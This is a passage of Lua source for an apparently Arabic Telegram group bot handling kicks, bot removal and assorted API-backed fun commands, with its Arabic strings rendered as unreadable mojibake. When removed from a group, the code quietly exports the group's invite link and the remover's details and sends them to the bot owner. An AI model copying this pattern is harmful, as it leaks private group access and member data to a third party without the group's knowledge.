database:del(bot_id..'Spam:Group'..msg.sender_user_id_) 
end
------------------------------------------------------------------------
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
database:set(bot_id..'User:Name'..msg.sender_user_id_,data.username_)
end;end,nil) 
-----------------
if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(bot_id) then 
function mahmoud(extra,result,success) 
function  reslit(f1,f2)
function mahmoud333(t1,t2)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function ({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data) 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
end,nil)
end,nil)
end,nil)
end,nil)
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
Text = "Ω­ΨͺΩ Ψ·Ψ±Ψ― Ψ§ΩΨ¨ΩΨͺ ΩΩ ΩΨ¬ΩΩΨΉΩ  \nΩ­ΩΨΉΨ±Ω Ψ§ΩΨΉΨΆΩ β―Β» @"..(result.username_ or "ΩΨ§ ΩΩΨ¬Ψ―").."\nΩ­Ψ§ΩΨ―Ω Ψ§ΩΨΉΨΆΩ β―Β» `"..msg.sender_user_id_.."`\nΩ­ΩΨΉΩΩΩΨ§Ψͺ Ψ§ΩΩΨ¬ΩΩΨΉΩ Ψ  \n\nΩ­Ψ§Ψ³Ω Ψ§ΩΩΨ¬ΩΩΨΉΩ β―Β»  *"..f2.title_.."*\nΩ­Ψ§ΩΨ―Ω Ψ§ΩΩΨ¬ΩΩΨΉΩ β―Β» `"..msg.chat_id_.."`\nΩ­Ψ±Ψ§Ψ¨Ψ· Ψ§ΩΩΨ¬ΩΩΨΉΩ ["..LinkGp.."] \nΩ­ΨͺΩ ΩΨ³Ψ­ Ψ¬ΩΩΨΉ Ψ¨ΩΨ§ΩΨ§ΨͺΩΨ§\n"
sendText(Id_Sudo,Text,0,'md')
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, mahmoud333, nil)
end
tdcli_function ({
ID = "GetChat",
chat_id_ = msg.chat_id_
}, reslit, nil) 
end
getUser(msg.sender_user_id_, mahmoud)
end

------------------------------------------------------------------------
if msg.content_.ID == "MessageChatAddMembers" then 

 ---==========================================
 ---==========================================
if msg.content_.members_[0].id_ == tonumber(bot_id) then 
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "Ψ±ΩΩΩΨ±")
tdcli_function ({ID = "GetUser",user_id_ = bot_id,},function(arg,data) 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = bot_id,offset_ = 0,limit_ = 1},function(extra,mahmoud,success) 
if mahmoud.photos_[0] then
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΨΆΩ Ψ§ΩΨ¨ΩΨͺ ΩΩΨ¬ΩΩΨΉΨͺΩ', url = "https://t.me/"..data.username_.."?startgroup=new"},
},
}
local msg_id = msg.id_/2097152/0.5
local Texti = "Ω­ ΩΨ±Ψ­Ψ¨Ψ§ Ψ§ΩΨ§ Ψ¨ΩΨͺ "..N.." \n\nβ Ψ§Ψ?ΨͺΨ΅Ψ§Ψ΅Ω Ψ§Ψ―Ψ§Ψ±Ψ© Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ ΩΩ Ψ§ΩΨ³Ψ¨Ψ§Ω ΩΨ§ΩΨ?..\nβ ΩΩΨͺΩΨΉΩΩ Ψ§Ψ±ΩΨΉΩΩ ΩΨ΄Ψ±Ω ΩΨ§Ψ±Ψ³Ω ΨͺΩΨΉΩΩ ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ ."
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(Texti)..'&photo='..mahmoud.photos_[0].sizes_[1].photo_.persistent_id_..'&reply_to_message_id='..msg_id..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end,nil)
end,nil)
end

 ---==========================================
 ---==========================================
database:set(bot_id.."Who:Added:Me"..msg.chat_id_..":"..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_ 
local Bots = database:get(bot_id.."Lock:Bot:kick"..msg.chat_id_) 
for i=0,#mem_id do 
if msg.content_.members_[i].type_.ID == "UserTypeBot" and not Admin(msg) and Bots == "kick" then 
https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
Get_Info = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(Get_Info)
if Json_Info.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah) local admins = tah.members_ for i=0 , #admins do if tah.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not is_Admin(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil) 
end
end 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatAddMembers" then 
local mem_id = msg.content_.members_ 
local Bots = database:get(bot_id.."Lock:Bot:kick"..msg.chat_id_) 
for i=0,#mem_id do 
if msg.content_.members_[i].type_.ID == "UserTypeBot" and not Admin(msg) and Bots == "del" then 
Get_Info = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(Get_Info)
if Json_Info.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah) local admins = tah.members_ for i=0 , #admins do if tah.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not is_Admin(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil) 
end
end 
end
end
------------------------------------------------------------------------
if text and database:get(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = database:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
database:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
database:del(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
database:srem(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ Ψ§Ψ²Ψ§ΩΨ© Ψ§ΩΨ§ΩΨ± ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
else
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ§ΩΨ± Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΨ§Ψ³Ω ΨͺΨ§ΩΨ― ΩΩ Ψ§ΩΨ§ΩΨ± ΩΨ§ΨΉΨ― Ψ§ΩΩΨ­Ψ§ΩΩΩ") 
end
database:del(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
------------------------------------------------------------------------
if data.message_.content_.text_ then
local NewCmmd = database:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
local Name_Bot = (database:get(bot_id.."Name:Bot") or "Ψ±ΩΩΩΨ±")
if not database:get(bot_id.."Fun_Bots"..msg.chat_id_) then
if text == ""..Name_Bot..' Ψ§Ω Ψ±Ψ£ΩΩ Ω Ψ―Ψ§' and tonumber(msg.reply_to_message_id_) > 0 then 
function FunBot(extra, result, success) 
local Fun = {'Ψ²Ω Ψ§ΩΨ²ΩΨͺ','ΩΩΨ§ ΩΨ§ΩΩ ΩΨΉΩ','Ω ΨͺΨ―Ψ?ΩΩΩΨ΄ ΩΨ§ Ψ¨ΩΩΩΩ π' }
send(msg.chat_id_, result.id_,''..Fun[math.random(#Fun)]..'') 
end 
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunBot, nil)
return false
end 
if text == ""..Name_Bot..' Ψ¨ΨͺΨ­Ψ¨ Ψ―Ψ§' and tonumber(msg.reply_to_message_id_) > 0 then 
function FunBot(extra, result, success) 
local Fun = {"ΩΩΨ§ ΩΨ§ΩΩ ΩΨΉΩ πΉ","ΩΨ§ ΩΨ§ ΩΨ΄ ΨΉΨ§Ψ¬Ψ¨ΩΩ πΉ","Ψ²ΩΨͺ ΨΉΩΩ Ψ―ΩΨ§ΨΊΩ πΉπ"}
send(msg.chat_id_,result.id_,''..Fun[math.random(#Fun)]..'') 
end 
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunBot, nil)
return false
end 
end
if text and text:match('^'..Name_Bot..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..Name_Bot..' ','')
end
if text == "ΩΩΩΩ" or text == "ΩΩΩΩ" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"Ψ§Ψ΅ΩΨ§ Ψ―Ψ§ Ψ§ΩΩ ΩΩ Ψ§ΩΩ ΨͺΨ±Ψ― ΨΉΩΩΩ πΉπ","ΩΩΩ ΩΩΩ ΨΉΩΩ Ψ¬Ψ±Ψ¨ΩΨΉ πΉπΉ","Ψ§Ψ­ΨΈΨ±Ω ΩΨ§Ψ±ΩΨ­ Ψ―ΩΨ§ΨΊΩΨ πΉ"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "Ψ¨ΩΨ³Ω" or text == "Ψ¨ΩΨ³Ω" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"ΩΩΩΩΩΩΩΩΩΩΨ§Ψ­Ψ­Ψ­????","ΨͺΨ€ ΨΉΩΨ¨ π","ΩΨ΄ Ψ§Ψ―Ψ§Ω Ψ§ΩΩΨ§Ψ³ ΩΩΩΩπ","Ω ΩΨ§Ψ― Ω Ψ΄ΩΩ ΨΉΩΨ¨ πΉβ₯","Ψ?Ψ― ΩΨ­Ψ­ πβ₯","ΩΨ§ ΩΩΨ§ΩΩ ΩΨ―Ψ§ π","ΨΉΨ§ΩΨ²ΩΩ Ψ§Ψ¨ΩΨ³ Ψ―Ψ§Ψ Ψ§Ψ­Ψ§Ψ§","ΨΊΩΨ± Ψ¨Ψ΄ΩΩΩ Ψ―Ψ§ ΩΨΉΩ π"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
--------------DEV-SONIC--------------
if text == 'Ψ΅ΩΨͺ' then   
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.voice_ then 
local mr = result.content_.voice_.voice_.persistent_id_ 
Addmp3(msg,msg.chat_id_,mr,msg.sender_user_id_..'.mp3')
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text == 'Ψ¨Ψ΅ΩΩ' then   
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.audio_ then 
local mr = result.content_.audio_.audio_.persistent_id_
Addvoi(msg,msg.chat_id_,mr,msg.sender_user_id_..'.ogg')
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
--------------DEV-SONIC--------------
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΩΨ§Ω" and Admin(msg) then
send(msg.chat_id_, msg.id_, ' Ω­ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΩΨ§Ω')
database:set(bot_id.."movie_bot"..msg.chat_id_,"close")
end
if text == "ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΩΨ§Ω" and Admin(msg) then
send(msg.chat_id_, msg.id_,' Ω­ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΩΨ§Ω')
database:set(bot_id.."movie_bot"..msg.chat_id_,"open")
end
if text and text:match("^ΩΩΩ (.*)$") and database:get(bot_id.."movie_bot"..msg.chat_id_) == "open" then
local Textm = text:match("^ΩΩΩ (.*)$")
data,res = https.request('https://black-source.tk/BlackTeAM/movie.php?serch='..URL.escape(Textm)..'')
if res == 200 then
getmo = json:decode(data)
if getmo.Info == true then
local Text ='ΩΨ΅Ω Ψ§ΩΩΩΩ'..getmo.info
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'ΩΨ΄Ψ§ΩΨ―Ω Ψ§ΩΩΩΩ Ψ¨Ψ¬ΩΨ―Ω 240',url=getmo.sd}},
{{text = 'ΩΨ΄Ψ§ΩΨ―Ω Ψ§ΩΩΩΩ Ψ¨Ψ¬ΩΨ―Ω 480', url=getmo.Web},{text = 'ΩΨ΄Ψ§ΩΨ―Ω Ψ§ΩΩΩΩ Ψ¨Ψ¬ΩΨ―Ω 1080', url=getmo.hd}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§Ψ¨Ψ±Ψ§Ψ¬" and Admin(msg) then
send(msg.chat_id_, msg.id_, ' Ω­ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§Ψ¨Ψ±Ψ§Ψ¬')
database:set(bot_id.." amir:brj_Bots"..msg.chat_id_,"close")
end
if text == "ΨͺΩΨΉΩΩ Ψ§ΩΨ§Ψ¨Ψ±Ψ§Ψ¬" and Admin(msg) then
send(msg.chat_id_, msg.id_,' Ω­ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ§Ψ¨Ψ±Ψ§Ψ¬')
database:set(bot_id.." amir:brj_Bots"..msg.chat_id_,"open")
end
if text and text:match("^Ψ¨Ψ±Ψ¬ (.*)$") and database:get(bot_id.." amir:brj_Bots"..msg.chat_id_) == "open" then
local Textbrj = text:match("^Ψ¨Ψ±Ψ¬ (.*)$")
gk = https.request('https://apiabs.ml/brg.php?brg='..URL.escape(Textbrj)..'')
br = JSON.decode(gk)
i = 0
for k,v in pairs(br.ok) do
i = i + 1
t = v.."\n"
end
send(msg.chat_id_, msg.id_, t)
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ­Ψ³Ψ§Ψ¨ Ψ§ΩΨΉΩΨ±" and Admin(msg) then
send(msg.chat_id_, msg.id_, ' Ω­ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ­Ψ³Ψ§Ψ¨ Ψ§ΩΨΉΩΨ±')
database:set(bot_id.." amir:age_Bots"..msg.chat_id_,"close")
end
if text == "ΨͺΩΨΉΩΩ Ψ­Ψ³Ψ§Ψ¨ Ψ§ΩΨΉΩΨ±" and Admin(msg) then
send(msg.chat_id_, msg.id_,' Ω­ ΨͺΩ ΨͺΩΨΉΩΩ Ψ­Ψ³Ψ§Ψ¨ Ψ§ΩΨΉΩΨ±')
database:set(bot_id.." amir:age_Bots"..msg.chat_id_,"open")
end
if text and text:match("^Ψ§Ψ­Ψ³Ψ¨ (.*)$") and database:get(bot_id.." amir:age_Bots"..msg.chat_id_) == "open" then
local Textage = text:match("^Ψ§Ψ­Ψ³Ψ¨ (.*)$")
ge = https.request('https://boyka-api.ml/Calculateage.php?age='..URL.escape(Textage)..'')
ag = JSON.decode(ge)
i = 0
for k,v in pairs(ag.ok) do
i = i + 1
t = v.."\n"
end
send(msg.chat_id_, msg.id_, t)
end
if text and text ~="Ψ­Ψ³Ψ§Ψ¨ Ψ§ΩΨΉΩΨ±" and database:get(bot_id..":"..msg.sender_user_id_.."homr"..msg.chat_id_) == "sendhomr" then
if text == 'Ψ§ΩΨΊΨ§Ψ‘' then 
send(msg.chat_id_, msg.id_, 'Ω­ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ± Ψ­Ψ³Ψ§Ψ¨ Ψ§ΩΨΉΩΨ± ')
database:del(bot_id..":"..msg.sender_user_id_.."homr"..msg.chat_id_)
return false  
end 
ge = https.request('https://leadermedo.herokuapp.com/omr.php?birthDate='..URL.escape(text)..'')
ag = JSON.decode(ge)
Y = "Ω­ ΨΉΩΨ±Ω Ψ¨Ψ§ΩΨ³ΩΩΩ = "..ag.year
Mo = "Ω­ ΨΉΩΨ±Ω Ψ¨Ψ§ΩΨ΄ΩΩΨ± = "..ag.month
W = "Ω­ ΨΉΩΨ±Ω Ψ¨Ψ§ΩΨ§Ψ³Ψ¨ΩΨΉ = "..ag.weeks
D = "Ω­ ΨΉΩΨ±Ω Ψ¨Ψ§ΩΨ§ΩΨ§Ω = "..ag.days
M = "Ω­ ΨΉΩΨ±Ω Ψ¨Ψ§ΩΨ―ΩΨ§Ψ¦Ω = "..ag.minutes
S = "Ω­ ΨΉΩΨ±Ω Ψ¨Ψ§ΩΨ«ΩΨ§ΩΩ = "..ag.seconds
send(msg.chat_id_, msg.id_,''..Y..'\n'..Mo..'\n'..W..'\n'..D..'\n'..M..'\n'..S..'\n[SOURCE REVOE](t.me/revorb0t)\n')
database:del(bot_id..":"..msg.sender_user_id_.."homr"..msg.chat_id_)
end
if text == "Ψ­Ψ³Ψ§Ψ¨ Ψ§ΩΨΉΩΨ±" or text == 'Ψ§Ψ­Ψ³Ψ¨ ΨΉΩΨ±Ω' and database:get(bot_id.." amir:age_Bots"..msg.chat_id_) == "open" then
database:set(bot_id..":"..msg.sender_user_id_.."homr"..msg.chat_id_,"sendhomr")
send(msg.chat_id_, msg.id_, 'Ω­ Ψ§Ψ±Ψ³Ω ΨͺΨ§Ψ±ΩΨ? ΩΩΩΨ§Ψ―Ω Ψ§ΩΨ§Ω\nΩ­ ΩΨ«Ψ§Ω 2/2/2002')
end
if text and text:match("^yt (.*)$") then
local m = text:match("^yt (.*)$")
tgg = https.request('https://mohot1.ml/mmmm/yotube_searchVersion0.2(iBadlz).php?search='..URL.escape(m)..'')
gg = JSON.decode(tgg)
S = 'Ω­ Ψ§ΩΨΉΩΩΨ§Ω = '..gg.title
A = 'Ω­ ΩΨ―ΨͺΩΨ§ = '..gg.time
V = 'Ω­ ΨΉΨ―Ψ― Ψ§ΩΩΨ΄Ψ§ΩΨ―Ψ§Ψͺ = '..gg.view
P = gg.image
ttx = ''..S..'\n'..A..'\n'..V..''
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΨΆΨΊΨ· ΩΩΨͺΨ­ΩΩΩ', callback_data="mp/"..gg.url},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo='..P..'&caption=' .. URL.escape(ttx).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text and text ~="ΨͺΨ±Ψ¬ΩΩ" and database:get(bot_id..":"..msg.sender_user_id_.."trans"..msg.chat_id_) == "trans" then
if text == 'Ψ§ΩΨΊΨ§Ψ‘' then 
send(msg.chat_id_, msg.id_, 'Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ± Ψ§ΩΨͺΨ±Ψ¬ΩΩ ')
database:del(bot_id..":"..msg.sender_user_id_.."trans"..msg.chat_id_)
return false  
end 
tr = https.request('https://apiabs.ml/Antk.php?abs='..text..'')
mm = JSON.decode(tr)
if tr.ok ~= false then   
S = mm.result.translate
end
send(msg.chat_id_, msg.id_, tr)
database:del(bot_id..":"..msg.sender_user_id_.."trans"..msg.chat_id_)
end
if text == "ΨͺΨ±Ψ¬ΩΩ" or text == 'Ψ§ΩΨͺΨ±Ψ¬ΩΩ' then
database:set(bot_id..":"..msg.sender_user_id_.."trans"..msg.chat_id_,"sendtrans")
send(msg.chat_id_, msg.id_, 'Ω­ Ψ§Ψ±Ψ³Ω Ψ§ΩΨ§Ω ΩΩΩΩ Ψ¨Ψ§ΩΨ§ΩΨ¬ΩΩΨ²ΩΩ ΩΨͺΨ±Ψ¬ΩΨͺΩΨ§ Ψ¨Ψ§ΩΩΨΊΩ Ψ§ΩΨΉΨ±Ψ¨ΩΩ')
end
if text == "ΨͺΨΉΨ·ΩΩ ΩΨΉΨ§ΩΩ Ψ§ΩΨ§Ψ³ΩΨ§Ψ‘" and Admin(msg) then
send(msg.chat_id_, msg.id_, 'β β½ ΨͺΩ ΨͺΨΉΨ·ΩΩ ΩΨΉΨ§ΩΩ Ψ§ΩΨ§Ψ³ΩΨ§Ψ‘')
database:set(bot_id.."MASONIC:Name_Bots"..msg.chat_id_,"close")
end
if text == "ΨͺΩΨΉΩΩ ΩΨΉΨ§ΩΩ Ψ§ΩΨ§Ψ³ΩΨ§Ψ‘" and Admin(msg) then
send(msg.chat_id_, msg.id_,'β β½ ΨͺΩ ΨͺΩΨΉΩΩ ΩΨΉΨ§ΩΩ Ψ§ΩΨ§Ψ³ΩΨ§Ψ‘')
database:set(bot_id.."MASONIC:Name_Bots"..msg.chat_id_,"open")
end
if text and text:match("^ΨͺΩΨ³Ψͺ (.*)$") then
local hhh = text:match("^ΨͺΩΨ³Ψͺ (.*)$")
gk = https.request('https://alsh-bg.ml/api/YouTube_Free.php?url='..hhh..'')
br = JSON.decode(gk)
send(msg.chat_id_, msg.id_, gk)
end
if text and text:match("^ΩΨΉΩΩ (.*)$") and database:get(bot_id.."MASONIC:Name_Bots"..msg.chat_id_) == "open" then
local TextName = text:match("^ΩΨΉΩΩ (.*)$")
gk = https.request('http://sonicx.ml/Api/Name.php?Name='..URL.escape(TextName)..'')
br = JSON.decode(gk)
send(msg.chat_id_, msg.id_,br.meaning)
end
if text and text ~="Ψ­Ψ³Ψ§Ψ¨ Ψ§ΩΨΉΩΨ±" and database:get(bot_id..":"..msg.sender_user_id_.."maany"..msg.chat_id_) == "sendmaany" then
if text == 'Ψ§ΩΨΊΨ§Ψ‘' then 
send(msg.chat_id_, msg.id_, 'Ω­ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§ΩΨ± ')
database:del(bot_id..":"..msg.sender_user_id_.."maany"..msg.chat_id_)
return false  
end 
gk = https.request('http://sonicx.ml/Api/Name.php?Name='..URL.escape(text)..'')
br = JSON.decode(gk)
send(msg.chat_id_, msg.id_,br.meaning)
database:del(bot_id..":"..msg.sender_user_id_.."maany"..msg.chat_id_)
end
if text == "ΩΨΉΨ§ΩΩ Ψ§ΩΨ§Ψ³ΩΨ§Ψ‘" and database:get(bot_id.."MASONIC:Name_Bots"..msg.chat_id_) == "open" then
database:set(bot_id..":"..msg.sender_user_id_.."maany"..msg.chat_id_,"sendmaany")
send(msg.chat_id_, msg.id_, 'Ω­ Ψ§Ψ±Ψ³Ω Ψ§ΩΨ§Ψ³Ω Ψ§ΩΨ§Ω')
end

if text == "Ψ²Ψ?Ψ±ΩΩ" or text == 'Ψ§ΩΨ²Ψ?Ψ±ΩΩ' then
local my_zh = database:get(bot_id.."my_zh:status"..msg.chat_id_)
if my_zh then
send(msg.chat_id_, msg.id_," Ω­ Ψ§ΩΨ²Ψ?Ψ±ΩΩ ΩΨΉΨ·ΩΩ") 
return false 
end
database:set(bot_id..":"..msg.sender_user_id_.."Zf"..msg.chat_id_,"sendZf")
send(msg.chat_id_, msg.id_, 'Ω­ Ψ§Ψ±Ψ³Ω ΩΩ Ψ§ΩΩΩΩΩ ΩΨ²Ψ?Ψ±ΩΨͺΩΨ§ \nΩ­ Ψ§ΩΨ²Ψ?Ψ±ΩΩ Ψ¨Ψ§ΩΩΨΊΩ : { en } ~ { ar } ')
end
if text and text ~="Ψ²Ψ?Ψ±ΩΩ" and database:get(bot_id..":"..msg.sender_user_id_.."Zf"..msg.chat_id_) == "sendZf" then
database:del(bot_id..":"..msg.sender_user_id_.."Zf"..msg.chat_id_)
local EmojeS = {
  ' π»',
  ' π΄  ',
  ' πΆ ',
  ' π‘',
  ' π’', 
  ' π£', 
  ' β½β',
  ' π ±Β²Β²', 
  'β½', 
  ' π‘β', 
  ' π‘β‘', 
  ' π‘¨', 
  }
  
  local Emoje = {
  ' β',
  ' π€',
  'Λπ€',
  ' ΰ½» β«',
  ' β« ',
  ' π Ά ',
  ' π ²',
  ' π‘₯',
  '  β¬',
  ' π€',
  ' πΌ',
  ' β  '
}

local Text = msg.text
local Zhrf = text:gsub('ΨΆ','ΨΆΩ°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ψ΅','Ψ΅Ω°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ψ«','Ψ«Ω°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ω','ΩΩ°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ω','ΩΝΩ°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('ΨΊ','ΨΊΩ°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('ΨΉ','ΨΉΩ°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ψ?','Ψ?ΜΩ°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ψ­','Ψ­Ω°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ψ¬','Ψ¬Ω°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ψ΄','Ψ΄Ω°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ψ³','Ψ³Ω°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ω','ΩΩ°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ψ¨','Ψ¨Ω°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ω','ΩΩ°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ψ§','Ψ’')
Zhrf = Zhrf:gsub('Ψͺ','ΨͺΩ°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ω','ΩΩ°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ω','ΩΩ°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ω','ΪͺΩ°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ψ·','Ψ·Ω°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('ΨΈ','ΨΈΩ°ΩΩΩΫ’')
Zhrf = Zhrf:gsub('Ψ‘','Ψ‘')
Zhrf = Zhrf:gsub('Ψ€','Ψ€')
Zhrf = Zhrf:gsub('Ψ±','Ψ±')
Zhrf = Zhrf:gsub('Ω','Ω')
Zhrf = Zhrf:gsub('Ψ²','Ψ²')
Zhrf = Zhrf:gsub('Ω','ο―Μ²ΰ­­')
Zhrf = Zhrf:gsub('Ω','ΫΏΫΏΫ')
Zhrf = Zhrf:gsub('a','π?')
Zhrf = Zhrf:gsub('A','π')
Zhrf = Zhrf:gsub("b","π―")
Zhrf = Zhrf:gsub("B","π")
Zhrf = Zhrf:gsub("c","π°")
Zhrf = Zhrf:gsub("C","π")
Zhrf = Zhrf:gsub("d","π±")
Zhrf = Zhrf:gsub("D","π")
Zhrf = Zhrf:gsub("e","π²")
Zhrf = Zhrf:gsub("E","π")
Zhrf = Zhrf:gsub("f","π³")
Zhrf = Zhrf:gsub("F","π")
Zhrf = Zhrf:gsub("g","π΄")
Zhrf = Zhrf:gsub("G","π")
